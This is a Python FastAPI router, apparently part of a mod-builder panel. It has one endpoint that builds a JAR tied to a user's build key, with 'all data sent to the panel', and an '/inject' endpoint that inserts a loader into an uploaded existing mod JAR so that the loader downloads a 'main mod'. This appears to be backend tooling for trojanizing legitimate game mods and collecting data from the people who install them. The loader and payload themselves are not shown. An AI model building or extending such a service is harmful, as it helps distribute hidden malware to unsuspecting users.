from fastapi import APIRouter, Depends, HTTPException, UploadFile, File
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from app.api import deps
from app.schemas.schemas import BuildRequest
from app.services.builder_service import builder_service
from app.models.user import User

router = APIRouter()

@router.post("/")
async def build_mod(
    request: BuildRequest,
    current_user: User = Depends(deps.get_current_user),
):
    """
    Build the mod with the user's build_key. All data will be sent to the panel.
    """
    try:
        jar_path = await builder_service.build_mod(
            mod_name=request.mod_name,
            user_id=current_user.id, 
            build_key=current_user.build_key
        )
        # Use mod_name for filename
        safe_name = request.mod_name.replace(' ', '_')[:20]
        return FileResponse(
            path=jar_path, 
            filename=f"{safe_name}.jar", 
            media_type='application/java-archive'
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/inject")
async def inject_mod(
    file: UploadFile = File(...),
    current_user: User = Depends(deps.get_current_user),
):
    """
    Inject loader into an existing mod JAR.
    The loader will contain the user's build key and download the main mod.
    """
    if not file.filename.endswith('.jar'):
        raise HTTPException(status_code=400, detail="Only JAR files are allowed")
    
    try:
        jar_path = await builder_service.inject_loader(
            jar_file=file,
            user_id=current_user.id,
            build_key=current_user.build_key
        )
        return FileResponse(
            path=jar_path,
            filename=f"injected-{file.filename}",
            media_type='application/java-archive'
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

